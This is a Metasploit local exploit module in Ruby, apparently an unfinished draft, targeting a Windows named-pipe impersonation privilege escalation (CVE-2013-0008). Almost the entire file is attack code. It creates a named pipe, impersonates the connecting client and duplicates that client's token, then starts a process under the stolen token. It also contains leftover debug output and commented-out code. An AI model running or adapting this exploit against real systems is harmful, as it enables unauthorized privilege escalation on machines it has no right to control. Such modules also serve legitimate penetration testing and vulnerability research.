##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'
require 'msf/core/post/file'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Windows::Error

  def initialize(info={})
    super( update_info( info,
      'Name'		=> 'Named Pipe Impersonation Privilege Escalation',
      'Description'	=> %q{
      },
      'License'	=> MSF_LICENSE,
      'Author'	=>
        [
          'Tavis Ormandy', # Discovery
          'Axel Souchet',  # @0vercl0k POC
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit module
        ],
      'Platform'	=> [ 'win' ],
      'SessionTypes'	=> [ 'meterpreter' ],
      'Targets'	=>
      [
        [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
        [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> "Nov 27 2012",
      'References' =>
        [
          [ 'CVE', '2013-0008' ],
          [ 'MSB', 'MS13-005' ],
          [ 'OSVDB', '88966'],
          [ 'URL', 'http://blog.cmpxchg8b.com/2013/02/a-few-years-ago-while-working-on.html' ]
        ]
    ))

    register_options(
      [
        OptString.new('NAMED_PIPE', [true, 'Custom command to type', '\\\\.\\pipe\\0day'])
      ], self.class
    )

  end

  #test echo 1 > \\.\pipe\0day
  def exploit
    named_pipe_name = datastore['NAMED_PIPE']



    #ret_val = client.railgun.advapi32.InitializeSecurityDescriptor(40,'SECURITY_DESCRIPTOR_REVISION')
    #security_descriptor =  ret_val['pSecurityDescriptor']
    #mem = session.railgun.kernel32.VirtualAlloc(nil, 0x100, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)['return']
    #puts security_descriptor.inspect
    #client.railgun.memwrite(mem,security_descriptor, security_descriptor.length)
    #puts mem
    #sec_attribs = [9,mem,0]
    #sec_attribs = sec_attribs.pack("LLC")
    #puts  sec_attribs.inspect
    sec_attribs = nil
    ret_val = client.railgun.kernel32.CreateNamedPipeA(named_pipe_name,
                                             'PIPE_ACCESS_DUPLEX',
                                             'PIPE_TYPE_MESSAGE | PIPE_WAIT',
                                             2,
                                             0,
                                             0,
                                             0,
                                             sec_attribs)
    puts ret_val
    pipe_handle = ret_val['return']

    if pipe_handle != 0xFFFFFFFF
      vprint_status("Created Pipe Handle: #{pipe_handle}")

      begin
        ret_val = client.railgun.kernel32.ConnectNamedPipe(pipe_handle, nil)
        puts ret_val
        vprint_status("Connection")

        begin
          puts client.railgun.kernel32.ReadFile(pipe_handle,
                                           1,
                                           1,
                                           4,
                                           nil)

          ret_val = client.railgun.kernel32.GetNamedPipeHandleStateA(pipe_handle,
                                                                    nil,
                                                                    4,
                                                                    nil,
                                                                    nil,
                                                                    256,
                                                                    256)

          if ret_val['return']
            username = ret_val['lpUserName']
            print_good("Impersonating #{username}")

            startinfo = [0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]
            startinfo = startinfo.pack("LLLLLLLLLLLLSSLLLL")
            cmdstr = "notepad.exe"


            token_all_access = "STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS |TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID"
            token_all_access = 0xf01ff
            ret_val = client.railgun.kernel32.GetCurrentThread() # Pseudo shouldn't need to run in correct thread.
            current_thread_handle = ret_val['return']
            puts current_thread_handle
            begin
              puts "multi_rail"
              multi_rail = []
              multi_rail << ['advapi32', 'ImpersonateNamedPipeClient', [pipe_handle]]
              multi_rail << ['advapi32', 'OpenThreadToken', [current_thread_handle, token_all_access, false, 4]]
              #shell32.ShellExecuteA(nil,"runas",cmd_location,nil,nil,5)
              #ret_val = client.railgun.advapi32.ImpersonateNamedPipeClient(pipe_handle)
              ret_vals = client.railgun.multi(multi_rail)
              begin
                puts ret_vals
                token_handle = ret_vals[1]['TokenHandle']
                puts token_handle

                ret_val = client.railgun.advapi32.DuplicateTokenEx(token_handle,
                                                                   'MAXIMUM_ALLOWED',
                                                                   nil,
                                                                   2, # SecurityImpersonation
                                                                   1, # TOkenPrimary
                                                                   4)

                puts ret_val

                new_token_handle = ret_val['phNewToken']

                cs = client.railgun.advapi32.CreateProcessAsUserA(new_token_handle,
                                                                  nil,
                                                                  cmdstr,
                                                                  nil,
                                                                  nil,
                                                                  true,
                                                                  "CREATE_NEW_CONSOLE",
                                                                  nil,
                                                                  nil,
                                                                  startinfo,
                                                                  16)

                puts cs
              ensure
                client.railgun.kernel32.CloseHandle(token_handle)
                client.railgun.kernel32.CloseHandle(new_token_handle)
              end
            ensure
              client.railgun.kernel32.CloseHandle(current_thread_handle)
            end
          end
        ensure
          vprint_status("Disconnecting pipe: #{pipe_handle}")
          client.railgun.kernel32.DisconnectNamedPipe(pipe_handle)
        end
      ensure
        vprint_status("Closing handle: #{pipe_handle}")
        client.railgun.kernel32.CloseHandle(pipe_handle)
      end
    end

  end

end

